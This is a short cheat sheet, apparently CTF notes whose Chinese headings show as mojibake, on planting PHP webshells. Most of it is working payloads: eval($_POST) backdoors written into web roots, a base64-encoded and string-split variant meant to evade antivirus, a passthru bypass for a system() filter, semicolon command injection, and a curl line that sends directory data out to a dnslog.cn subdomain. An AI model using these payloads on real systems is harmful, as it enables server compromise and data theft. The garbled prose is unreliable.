# å†™æœ¨é©¬å¯èƒ½é‡åˆ°çš„é—®é¢˜

## phpinfo + ğŸ

- ä¸çŸ¥é“ä¸Šä¼ çš„é©¬æ˜¯å¦æˆåŠŸï¼Œå› æ­¤åŠ phpinfo

## è¿‡æ»¤system->å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾

- dnslogå¸¦å¤–ï¼Œwgetæˆ–è€…curl
- å¦‚æœè¿˜æ˜¯æ˜¾ç¤ºä¸äº†ï¼Œå°è¯•ç”¨base64ç¼–ç 

```shell
shell_exec('curl `pwd|base64`.x3c7at.dnslog.cn')
```

- å†™ğŸ

```php
shell_exec('echo "<?php eval($_POST[1])?>" > /var/www/html/basic/web/1.php')
```

### 

## $éœ€è¦è½¬ä¹‰

:::info
**æœ‰æ—¶å€™å¤–é¢æ˜¯å•å¼•å·ï¼Œé‡Œé¢æ˜¯åŒå¼•å·æ‰§è¡Œä¸äº†ï¼Œéœ€è¦å¤šå°è¯•ä¸€ä¸‹**
:::

- å½“ä½¿ç”¨shell_execæ—¶ï¼Œå¤–é¢æ˜¯åŒå¼•å·ï¼Œé‡Œé¢æ˜¯å•å¼•å·ï¼Œå°±éœ€è¦è½¬ä¹‰

```php
shell_exec( "echo '<?php echo 111111;eval(\$_POST[1]);?>' > /var/www/html/basic/web/2.php";)

```

## è¿‡æ»¤system

[https://www.php.net/manual/zh/function.passthru.php](https://www.php.net/manual/zh/function.passthru.php)

- ä½¿ç”¨passthruç»•è¿‡ï¼Œä¸”æœ‰å›æ˜¾ ï¼Œå¤ªç‰›é€¼äº†

## ç›´æ¥ç”¨system

```php
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/1.txt')?>
```

- `system`ç›´æ¥æ‰§è¡Œå‘½ä»¤

## å…æ€é©¬

:::info
å‰é¢çš„å­—ç¬¦ä¸²æ˜¯å¯¹`<?php eval($_POST[1]);?>`è¿›è¡Œ`base64`åŠ å¯†çš„ç»“æœ
:::

```php
<?php 
system('echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==" | base64 -d > /var/www/html/shell.php');
?>
```

**æ–¹æ³•2ï¼š**

```php
<?php
$s = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$s);
?>
```

- ç›®å‰æˆ‘è¿˜æ²¡æˆåŠŸ

## shell_execæ— å›æ˜¾

:::info

- `requestbin`å¸¦å‡º
- å†™`$`è½¬ä¹‰é©¬
- `cp`æˆ–è€…`mv`å¤åˆ¶

`**;**`**æˆªæ–­ç­¾åçš„å‘½ä»¤**
:::

```php
shell_exec(';echo  "<?php eval(\$_POST[1]);?>" >a.php;')

 shell_exec(';cp /var/www/html/flag.php /var/www/html/1.txt') 
shell_exec(';mv /var/www/html/flag.php /var/www/html/1.txt') 
```



